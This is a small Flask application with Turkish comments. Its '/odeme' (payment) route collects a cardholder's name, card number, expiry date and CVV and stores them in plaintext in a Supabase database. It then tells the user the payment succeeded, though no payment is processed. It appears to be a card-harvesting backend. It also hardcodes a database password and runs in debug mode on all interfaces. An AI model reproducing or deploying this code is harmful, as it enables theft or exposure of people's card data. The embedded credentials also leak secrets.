import os
from flask import Flask, render_template, request
import psycopg2  # PostgreSQL bağlantısı için

app = Flask(__name__)

# Supabase Veritabanı Bağlantı Bilgileri
DB_HOST = "db.frfxpoeacbrfjklyyxma.supabase.co"
DB_NAME = "postgres"
DB_USER = "postgres"
DB_PASSWORD = "atillathegreat1453"  
DB_PORT = "5432"

def get_db_connection():
    conn = psycopg2.connect(
        host=DB_HOST,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
        port=DB_PORT
    )
    return conn

# 1. ANA SAYFA (404 Hatasını Çözen Kısım)
@app.route('/')
def index():
    return render_template('index.html')

# 2. ÖDEME / FORM GÖNDERME ROTASI
@app.route('/odeme', methods=['POST'])
def odeme():
    # HTML formundan gelen veriler
    adsoyad = request.form.get('adsoyad')
    kart_numarasi = request.form.get('kart_numarasi')
    skt = request.form.get('skt')
    cvv = request.form.get('cvv')

    conn = get_db_connection()
    cur = conn.cursor()
    
    # Supabase veritabanına kaydetme
    cur.execute(
        "INSERT INTO siparisler (ad_soyad, kart_numarasi, son_kullanma, cvv) VALUES (%s, %s, %s, %s)",
        (adsoyad, kart_numarasi, skt, cvv)
    )
    
    conn.commit()
    cur.close()
    conn.close()

    return "Ödemeniz başarıyla alındı!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
